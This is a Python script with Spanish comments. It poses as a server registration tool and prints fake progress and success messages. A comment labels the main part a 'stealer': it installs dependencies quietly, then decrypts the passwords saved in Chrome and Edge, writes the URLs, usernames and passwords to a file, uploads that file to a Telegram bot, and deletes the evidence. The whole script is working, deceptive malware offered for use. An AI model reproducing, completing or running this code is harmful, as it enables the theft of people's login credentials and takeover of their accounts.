import importlib
import sys
import time
import subprocess
import os

def verificar_pip():
    try:
        importlib.import_module('pip')
        print("pip ya está instalado.")
        return True
    except ImportError:
        print("pip no está instalado.")
        return False

def instalar_pip():
    if not verificar_pip():
        print("Instalando pip...")
        try:
            subprocess.check_call([sys.executable, '-m', 'ensurepip', '--default-pip'])
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--upgrade', 'pip'])
            print("pip instalado correctamente.")
        except Exception as e:
            print(f"No se pudo instalar pip: {e}")

def instalar_biblioteca(biblioteca):
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', biblioteca])
        print(f"{biblioteca} instalado correctamente.")
    except Exception as e:
        print(f"No se pudo instalar {biblioteca}: {e}")

def main():
    print("Se está registrando tu servidor...")
    instalar_pip()

    bibliotecas = ["pycryptodomex", "pywin32", "requests"]
    for i, biblioteca in enumerate(bibliotecas):
        print(f"Instalando {biblioteca}...")
        instalar_biblioteca(biblioteca)

    print("Conectando servidor...")

if __name__ == "__main__":
    main()



##### AQUI COMIENZA EL STEALER, LO ANTERIOR INSTALA AUTOMATICAMENTE LAS LIBRERIAS NECESARIAS #####
import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import re
import requests

def get_secret_key(browser_path_local_state):
    try:
        with open(browser_path_local_state, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print(f"{e}\n[ERR] Secret key cannot be found for {browser_path_local_state}")
        return None

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = AES.new(secret_key, AES.MODE_GCM, initialisation_vector)
        decrypted_pass = cipher.decrypt(encrypted_password).decode()
        return decrypted_pass
    except Exception as e:
        print(f"{e}\n[ERR] Unable to decrypt, browser version might not be supported. Please check.")
        return ""

def get_db_connection(browser_path_login_db):
    try:
        shutil.copy2(browser_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print(f"{e}\n[ERR] Browser database cannot be found")
        return None

def process_logins(browser, browser_path, secret_key, output_file):
    folders = [folder for folder in os.listdir(browser_path) if re.search("^Profile*|^Default$", folder) != None]
    for folder in folders:
        browser_path_login_db = os.path.normpath(f"{browser_path}\\{folder}\\Login Data")
        conn = get_db_connection(browser_path_login_db)
        if conn:
            cursor = conn.cursor()
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for login in cursor.fetchall():
                url, username, ciphertext = login
                if url != "" and username != "" and ciphertext != "":
                    decrypted_password = decrypt_password(ciphertext, secret_key)
                    output_file.write(f"NAVEGADOR: {browser}\nURL: {url}\nUSERNAME: {username}\nPASSWORD: {decrypted_password}\n---------------------------\n")
            cursor.close()
            conn.close()
            os.remove("Loginvault.db")

def send_file_telegram(chat_id, token, file_path):
    url = f"https://api.telegram.org/bot{token}/sendDocument"
    files = {'document': open(file_path, 'rb')}
    data = {'chat_id': chat_id}
    r = requests.post(url, files=files, data=data)
    return r.json()

if __name__ == '__main__':
    chrome_key = get_secret_key(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % os.environ['USERPROFILE'])
    edge_key = get_secret_key(r"%s\AppData\Local\Microsoft\Edge\User Data\Local State" % os.environ['USERPROFILE'])

    with open('usuario.txt', 'w', encoding='utf-8') as decrypt_password_file:
        if chrome_key:
            process_logins("Chrome", r"%s\AppData\Local\Google\Chrome\User Data" % os.environ['USERPROFILE'], chrome_key, decrypt_password_file)
        if edge_key:
            process_logins("Edge", r"%s\AppData\Local\Microsoft\Edge\User Data" % os.environ['USERPROFILE'], edge_key, decrypt_password_file)

    telegram_chat_id = "AQUI_PONEN_SU_ID"
    telegram_bot_token = "AQUI_PONEN_EL_TOKEN_DE_SU_BOT"
    txt_file_path = 'usuario.txt'

    send_file_telegram(telegram_chat_id, telegram_bot_token, txt_file_path)
    os.remove("usuario.txt")



print("Te haz registrado con exito!")
input("Presiona Enter para cerrar...")
